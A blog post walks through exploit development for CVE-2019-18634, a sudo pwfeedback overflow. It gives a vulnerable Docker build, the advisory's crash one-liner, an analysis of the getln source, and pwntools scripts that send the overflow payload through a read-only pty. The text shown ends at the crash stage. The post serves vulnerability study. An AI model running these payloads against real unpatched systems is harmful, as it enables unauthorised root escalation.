<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>A CVE Journey: From Crash to Local Privilege Escalation :: iamalsaher — Experiments</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="This post is a complete walkthrough for the process of writing an exploit for CVE 2019-18634. I will talk about the methedologies used and why is it such a good bug to begin your real world exploitation skills. This bug allows for Local Privilege Escalation because of a BSS based overflow, which allows for the overwrite of user_details struct with uid 0, essentially escalating your privilege. This bug can be triggered even by users not listed in the sudoers file There is no impact unless pwfeedback has been enabled."/>
<meta name="keywords" content="reverse engineering, binary, exploitation, diffing, bindiffing"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://iamalsaher.tech/posts/2020-02-08-cve-2019-18634/" />





<link rel="stylesheet" href="https://iamalsaher.tech/assets/style.css">


<link rel="stylesheet" href="https://iamalsaher.tech/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://iamalsaher.tech/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="https://iamalsaher.tech/img/favicon.png">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="A CVE Journey: From Crash to Local Privilege Escalation"/>
<meta name="twitter:description" content="This post is a complete walkthrough for the process of writing an exploit for CVE 2019-18634. I will talk about the methedologies used and why is it such a good bug to begin your real world exploitation skills. This bug allows for Local Privilege Escalation because of a BSS based overflow, which allows for the overwrite of user_details struct with uid 0, essentially escalating your privilege. This bug can be triggered even by users not listed in the sudoers file There is no impact unless pwfeedback has been enabled."/>



<meta property="og:title" content="A CVE Journey: From Crash to Local Privilege Escalation" />
<meta property="og:description" content="This post is a complete walkthrough for the process of writing an exploit for CVE 2019-18634. I will talk about the methedologies used and why is it such a good bug to begin your real world exploitation skills. This bug allows for Local Privilege Escalation because of a BSS based overflow, which allows for the overwrite of user_details struct with uid 0, essentially escalating your privilege. This bug can be triggered even by users not listed in the sudoers file There is no impact unless pwfeedback has been enabled." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://iamalsaher.tech/posts/2020-02-08-cve-2019-18634/" />
<meta property="article:published_time" content="2020-02-08T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-02-08T00:00:00+00:00" /><meta property="og:site_name" content="iamalsaher" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">iamalsaher</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h2 class="post-title"><a href="https://iamalsaher.tech/posts/2020-02-08-cve-2019-18634/">A CVE Journey: From Crash to Local Privilege Escalation</a></h2>
    <div class="post-meta">
      
        <span class="post-date">
          08-02-2020
        </span>

        
          
            



          
        
      

      
      
    </div>

    
      <span class="post-tags">
        
          #<a href="https://iamalsaher.tech/tags/poc/">POC</a>&nbsp;
        
          #<a href="https://iamalsaher.tech/tags/cve/">CVE</a>&nbsp;
        
          #<a href="https://iamalsaher.tech/tags/cve-2019-18634/">CVE-2019-18634</a>&nbsp;
        
          #<a href="https://iamalsaher.tech/tags/python/">python</a>&nbsp;
        
          #<a href="https://iamalsaher.tech/tags/lpe/">LPE</a>&nbsp;
        
          #<a href="https://iamalsaher.tech/tags/privilege-escalation/">Privilege Escalation</a>&nbsp;
        
      </span>
    

    

    <div class="post-content">
      <ul>
<li>This post is a complete walkthrough for the process of writing an exploit for CVE 2019-18634. I will talk about the methedologies used and why is it such a good bug to begin your real world exploitation skills.</li>
<li>This bug allows for Local Privilege Escalation because of a BSS based overflow, which allows for the overwrite of user_details struct with uid 0, essentially escalating your privilege. This bug can be triggered even by users not listed in the sudoers file</li>
<li>There is no impact unless pwfeedback has been enabled.</li>
</ul>
<h1 id="prelude">Prelude</h1>
<p>My journey started with a member in the <a href="https://opentoallctf.github.io/">OpenToAll</a> slack group posting a link for some <a href="https://www.sudo.ws/alerts/pwfeedback.html">CVE advisory</a>. Going through the advisory highlights some of the points which made me think I can use this bug for my first CVE POC.</p>
<ul>
<li><code>a user may be able to trigger a stack-based buffer overflow</code></li>
<li><code>versions 1.7.1 to 1.8.30 inclusive are affected</code></li>
<li><code>Exploiting the bug does not require sudo permissions</code></li>
<li><code>the stack overflow may allow unprivileged users to escalate to the root account</code></li>
</ul>
<p>All of these make this bug a very lucarative option for a newbie to start, and since this is just a stack based buffer overflow, I decided to give it a try.</p>
<h1 id="setup">Setup</h1>
<p>To not ruin my default Linux installation, I decided to reproduce the bug in a docker container. It would be lighter than a full blown VM and I won&rsquo;t have to worry about the installation ruining something if it goes wrong. 80% of the Dockerfile has been copied from grazfather&rsquo;s <a href="https://github.com/Grazfather/pwndock/blob/master/Dockerfile">Pwndock</a>. My addition to it is the automatic build script to deploy the sudo version I needed to test. <code>sudouser</code> for the user which has sudo privileges, and <code>testuser</code> for the user without sudo privileges.</p>
<h4 id="dockerfile">Dockerfile</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker"><span style="color:#66d9ef">RUN</span> adduser --disabled-password --gecos <span style="color:#e6db74">&#39;&#39;</span> sudouser<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> adduser --disabled-password --gecos <span style="color:#e6db74">&#39;&#39;</span> testuser<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> echo sudouser:sudouser | chpasswd<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> echo testuser:testuser | chpasswd<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> sudo-1.8.25p1 /tmp/sudo-1.8.25p1<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> build /tmp/sudo-1.8.25p1<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /tmp/sudo-1.8.25p1</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x ./build<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> ./build<span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><h4 id="buildsh">build.sh</h4>
<p>Note the <code>pwfeedback</code> in /etc/sudoers, need to set it to reach the codepath for the vulnerability.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
sed -e <span style="color:#e6db74">&#39;/^pre-install:/{N;s@;@ -a -r $(sudoersdir)/sudoers;@}&#39;</span> -i plugins/sudoers/Makefile.in

./configure --prefix<span style="color:#f92672">=</span>/usr              <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            --libexecdir<span style="color:#f92672">=</span>/usr/lib      <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            --with-secure-path         <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            --with-all-insults         <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            --with-env-editor          <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            --enable-pie               <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            --docdir<span style="color:#f92672">=</span>/usr/share/doc/sudo-1.8.31 <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            --with-passprompt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[sudo] password for %p: &#34;</span>

make
make install
ln -sfv libsudo_util.so.0.0.0 /usr/lib/sudo/libsudo_util.so.0

cat &gt; /etc/sudoers &lt;&lt; <span style="color:#e6db74">&#34;EOF&#34;</span>
Defaults	env_reset,pwfeedback
Defaults	mail_badpass
Defaults	secure_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&#34;</span>
root	ALL<span style="color:#f92672">=</span><span style="color:#f92672">(</span>ALL:ALL<span style="color:#f92672">)</span> ALL
%admin ALL<span style="color:#f92672">=</span><span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> ALL
%sudo	ALL<span style="color:#f92672">=</span><span style="color:#f92672">(</span>ALL:ALL<span style="color:#f92672">)</span> ALL
EOF

usermod -aG sudo sudouser
</code></pre></div><h1 id="crash">Crash</h1>
<pre><code>For sudo versions prior to 1.8.26, and on systems with uni-directional pipes, 
reproducing the bug is simpler. Here, the terminal kill character is set to the 
NUL character (0x00) since sudo is not reading from a terminal. This method is 
not effective in newer versions of sudo due to a change in EOF handling introduced 
in 1.8.26.
</code></pre><p>I decided to give the 1.8.25p1 version a try. After setting up my docker, I decided to reproduce the crash with the payload given in the advisory. The crash happened as expected.</p>
<pre><code>perl -e 'print((&quot;A&quot; x 100 . chr(0)) x 50)' | sudo -S -k id
Password: Segmentation fault (core dumped)
</code></pre><p>Its time to get to the root of the bug (pun intended)</p>
<h1 id="debugging">Debugging</h1>
<p>sudo is a <code>suid</code> binary</p>
<pre><code class="language-root@sudotester:/mnt#" data-lang="root@sudotester:/mnt#">-rwsr-xr-x 1 root root 519024 Feb  5 21:29 /usr/bin/sudo
</code></pre><p>You cannot just run a sudo command from a non privileged user and attach the debugger to it. The debugger needs to run as root and now when sudo is triggered as a non privileged user, the debugger can attach to it given its pid.</p>
<p>Let&rsquo;s start by setting up a pwntools script to run sudo and give input to it</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

TARGET<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/bin/sudo</span><span style="color:#e6db74">&#34;</span>)

p <span style="color:#f92672">=</span> process([TARGET,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-S</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">id</span><span style="color:#e6db74">&#34;</span>])
pause()
payload <span style="color:#f92672">=</span> (<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Password: </span><span style="color:#e6db74">&#34;</span>)
p<span style="color:#f92672">.</span>sendline(payload)
p<span style="color:#f92672">.</span>interactive()
sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
</code></pre></div><p>Running this pauses the script, giving us time to attach the debugger<br>
Once attached, continue the execution in gdb and press any key to continue the python script.<br>
You can see the result below</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/usr/bin/sudo&#39;</span>: pid <span style="color:#ae81ff">21958</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Paused <span style="color:#f92672">(</span>press any to <span style="color:#66d9ef">continue</span><span style="color:#f92672">)</span>
</code></pre></div><p><a href="https://asciinema.org/a/wLhB3K7xkeNbSmBuTb5XBgkgD"><img src="https://asciinema.org/a/wLhB3K7xkeNbSmBuTb5XBgkgD.svg" alt="asciicast"></a></p>
<p>At 00:21, we get a segmentation fault in the debugger and we have the complete stack trace to see how we reached this point. This will come very handy while analysing the bug.</p>
<h1 id="analysis-of-the-bug">Analysis of the Bug</h1>
<p>First a very important line from the advisory</p>
<pre><code>The bug can be reproduced by passing a large input with embedded terminal 
kill characters to sudo from a pseudo-terminal that cannot be written to
</code></pre><p>The phrase <strong>&lsquo;from a pseudo-terminal that cannot be written to&rsquo;</strong> is very important as without that specific condition, the bug cannot be triggered, so first let&rsquo;s focus on that part. We will look at the code to understand how the bug manifests.</p>
<p>Remember from the stack trace, the function which crashes is <strong>getln</strong>, so lets find that first.</p>
<p>A very good technique to find bits in complete source directory is the <strong>grep</strong> trick, which can list the files containing a string.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  sudo-1.8.25p1 grep -nr <span style="color:#e6db74">&#34;getln&#34;</span>           
config.h:252:/* Define to <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">if</span> you have the <span style="color:#e6db74">`</span>fgetln<span style="color:#e6db74">&#39; function. */
</span><span style="color:#e6db74">config.h.in:251:/* Define to 1 if you have the `fgetln&#39;</span> <span style="color:#66d9ef">function</span>. */
lib/util/getline.c:43:    buf <span style="color:#f92672">=</span> fgetln<span style="color:#f92672">(</span>fp, &amp;len<span style="color:#f92672">)</span>;
configure.ac:2559:    AC_CHECK_FUNCS<span style="color:#f92672">(</span><span style="color:#f92672">[</span>fgetln<span style="color:#f92672">]</span><span style="color:#f92672">)</span>
src/tgetpass.c:51:static char *getln<span style="color:#f92672">(</span>int, char *, size_t, int<span style="color:#f92672">)</span>;
src/tgetpass.c:178:    pass <span style="color:#f92672">=</span> getln<span style="color:#f92672">(</span>input, buf, sizeof<span style="color:#f92672">(</span>buf<span style="color:#f92672">)</span>, ISSET<span style="color:#f92672">(</span>flags, TGP_MASK<span style="color:#f92672">)</span><span style="color:#f92672">)</span>;
src/tgetpass.c:284:    pass <span style="color:#f92672">=</span> getln<span style="color:#f92672">(</span>pfd<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>, buf, sizeof<span style="color:#f92672">(</span>buf<span style="color:#f92672">)</span>, 0<span style="color:#f92672">)</span>;
src/tgetpass.c:308:getln<span style="color:#f92672">(</span>int fd, char *buf, size_t bufsiz, int feedback<span style="color:#f92672">)</span>
src/tgetpass.c:314:    debug_decl<span style="color:#f92672">(</span>getln, SUDO_DEBUG_CONV<span style="color:#f92672">)</span>
configure:19226:    <span style="color:#66d9ef">for</span> ac_func in fgetln
configure:19228:  ac_fn_c_check_func <span style="color:#e6db74">&#34;</span>$LINENO<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;fgetln&#34;</span> <span style="color:#e6db74">&#34;ac_cv_func_fgetln&#34;</span>
configure:19229:if test <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">x</span>$ac_cv_func_fgetln<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> xyes; <span style="color:#66d9ef">then</span> :
</code></pre></div><p>Ignoring the config lines and some calling lines, we can guess <strong>tgetpass.c:308</strong> is our candidate<br>
Let&rsquo;s analyse the bug</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">getln</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t bufsiz, <span style="color:#66d9ef">int</span> feedback){
    size_t left <span style="color:#f92672">=</span> bufsiz;
    ssize_t nr <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cp <span style="color:#f92672">=</span> buf;
    <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">\0</span><span style="color:#e6db74">&#39;</span>;
    debug_decl(getln, SUDO_DEBUG_CONV)

    <span style="color:#66d9ef">if</span> (left <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
	errno <span style="color:#f92672">=</span> EINVAL;
	debug_return_str(NULL);		<span style="color:#75715e">/* sanity */</span>
    }

    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">-</span><span style="color:#f92672">-</span>left) {
	nr <span style="color:#f92672">=</span> read(fd, <span style="color:#f92672">&amp;</span>c, <span style="color:#ae81ff">1</span>);
	<span style="color:#66d9ef">if</span> (nr <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span><span style="color:#f92672">|</span> c <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">|</span><span style="color:#f92672">|</span> c <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">\r</span><span style="color:#e6db74">&#39;</span>)
	    <span style="color:#66d9ef">break</span>;
	<span style="color:#66d9ef">if</span> (feedback) {
	    <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">=</span><span style="color:#f92672">=</span> sudo_term_kill) {
		<span style="color:#66d9ef">while</span> (cp <span style="color:#f92672">&gt;</span> buf) {
		    <span style="color:#66d9ef">if</span> (write(fd, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\b</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\b</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
			<span style="color:#66d9ef">break</span>;
		    <span style="color:#f92672">-</span><span style="color:#f92672">-</span>cp;
		}
		left <span style="color:#f92672">=</span> bufsiz;
		<span style="color:#66d9ef">continue</span>;
	    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">=</span><span style="color:#f92672">=</span> sudo_term_erase) {
		<span style="color:#66d9ef">if</span> (cp <span style="color:#f92672">&gt;</span> buf) {
		    <span style="color:#66d9ef">if</span> (write(fd, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\b</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\b</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
			<span style="color:#66d9ef">break</span>;
		    <span style="color:#f92672">-</span><span style="color:#f92672">-</span>cp;
		    left<span style="color:#f92672">+</span><span style="color:#f92672">+</span>;
		}
		<span style="color:#66d9ef">continue</span>;
	    }
	    ignore_result(write(fd, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">*</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>));
	}
	<span style="color:#f92672">*</span>cp<span style="color:#f92672">+</span><span style="color:#f92672">+</span> <span style="color:#f92672">=</span> c;
    }
    <span style="color:#f92672">*</span>cp <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">\0</span><span style="color:#e6db74">&#39;</span>;
    <span style="color:#66d9ef">if</span> (feedback) {
	<span style="color:#75715e">/* erase stars */</span>
	<span style="color:#66d9ef">while</span> (cp <span style="color:#f92672">&gt;</span> buf) {
	    <span style="color:#66d9ef">if</span> (write(fd, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\b</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\b</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
		<span style="color:#66d9ef">break</span>;
	    <span style="color:#f92672">-</span><span style="color:#f92672">-</span>cp;
	}
    }

    debug_return_str_masked(nr <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> buf : NULL);
}
</code></pre></div><p>Basically what the function does is, copies <strong>buf</strong> and <strong>bufsiz</strong> to new values, <strong>cp</strong> and <strong>left</strong> respectively, I am guessing, cp means current pointer.
Then it starts looping while there is still space left in the buffer. It uses a read call to read one byte from the file descriptor, and analyses the character received. If it is a new line or carriage return or if no character was read, the loop will break and the password is returned to the caller.</p>
<p>Note the line <strong>if(feedback)</strong>, in that check, if the feedback is enabled then a &lsquo;*&rsquo; needs to be printed on the fd(pty) for every character entered, and if the delete button is pressed, the * needs to be removed. To remove the asterisk &lsquo;\b&rsquo; or backspace is written to the fd and this deletes the asterisk.</p>
<h4 id="can-you-spot-the-bug">Can you spot the bug?</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> (c <span style="color:#f92672">=</span><span style="color:#f92672">=</span> sudo_term_kill) {
<span style="color:#66d9ef">while</span> (cp <span style="color:#f92672">&gt;</span> buf) {
    <span style="color:#66d9ef">if</span> (write(fd, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\b</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\b</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
    <span style="color:#66d9ef">break</span>;
    <span style="color:#f92672">-</span><span style="color:#f92672">-</span>cp;
}
left <span style="color:#f92672">=</span> bufsiz;
<span style="color:#66d9ef">continue</span>;
</code></pre></div><blockquote>
<p>If the write fails, the loop breaks and the left is set to bufsize, but cp is not reset back to the original position.</p>
</blockquote>
<p>Hence it very important to have the write fail, if the write doesn&rsquo;t fail the bug will never trigger. This answers the <strong>cannot be written to</strong> part, but what about the pseudo-terminal, why is that needed? To understand that we need to focus on the line <strong>if (c == sudo_term_kill)</strong>, and see where this sudo_term_kill character comes from. Using the same grep trick, we see the following</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  sudo-1.8.25p1 grep -nr <span style="color:#e6db74">&#34;sudo_term_kill&#34;</span>
lib/util/util.exp:134:sudo_term_kill
lib/util/util.exp.in:102:sudo_term_kill
lib/util/term.c:101:__dso_public int sudo_term_kill;
lib/util/term.c:236:	sudo_term_kill <span style="color:#f92672">=</span> term.c_cc<span style="color:#f92672">[</span>VKILL<span style="color:#f92672">]</span>;
src/tgetpass.c:305:extern int sudo_term_erase, sudo_term_kill;
src/tgetpass.c:326:	    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>c <span style="color:#f92672">=</span><span style="color:#f92672">=</span> sudo_term_kill<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</code></pre></div><p><a href="http://man7.org/linux/man-pages/man3/termios.3.html">sudo_term_kill = term.c_cc[VKILL]</a>, looking at the reference for VKILL, we understand that it is something set by termios. sudo uses termios to setup echo/no echo for the password and probably for variety of other things. Using a pty or pseudo-terminal is important because we need null bytes to exploit the bug. If we don&rsquo;t use a pty, VKILL is set to <strong>'\0&rsquo;</strong>, making exploitaton impossible.</p>
<p>Let&rsquo;s now write the relevant code which uses a pty and can also make the write fail</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span>os
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

TARGET<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/bin/sudo</span><span style="color:#e6db74">&#34;</span>)

mfd, sfd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>openpty()
fd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>open(os<span style="color:#f92672">.</span>ttyname(sfd), os<span style="color:#f92672">.</span>O_RDONLY)
</code></pre></div><p>We first open a pty with <a href="http://man7.org/linux/man-pages/man3/openpty.3.html">os.openpty()</a>, then we get the name of the fd, and open it in readonly mode, we now pass this fd to the program as the stdin, since the fd was opened in readonly, the write will always fail, we can write to mfd and that data would be sent over to fd, but nothing written to fd would be sent back. So no password prompt now :). We also change the character from &ldquo;\x00&rdquo; to &ldquo;\x15&rdquo; because null byte now won&rsquo;t crash the sudo binary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span>os
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

TARGET<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/bin/sudo</span><span style="color:#e6db74">&#34;</span>)

mfd, sfd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>openpty()
fd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>open(os<span style="color:#f92672">.</span>ttyname(sfd), os<span style="color:#f92672">.</span>O_RDONLY)

p <span style="color:#f92672">=</span> process([TARGET,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-S</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">id</span><span style="color:#e6db74">&#34;</span>],stdin<span style="color:#f92672">=</span>fd)
pause()
payload <span style="color:#f92672">=</span> (<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x15</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>
os<span style="color:#f92672">.</span>write(mfd, payload<span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
pause()
sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/usr/bin/sudo&#39;</span>: pid <span style="color:#ae81ff">4487</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Paused <span style="color:#f92672">(</span>press any to <span style="color:#66d9ef">continue</span><span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Paused <span style="color:#f92672">(</span>press any to <span style="color:#66d9ef">continue</span><span style="color:#f92672">)</span>
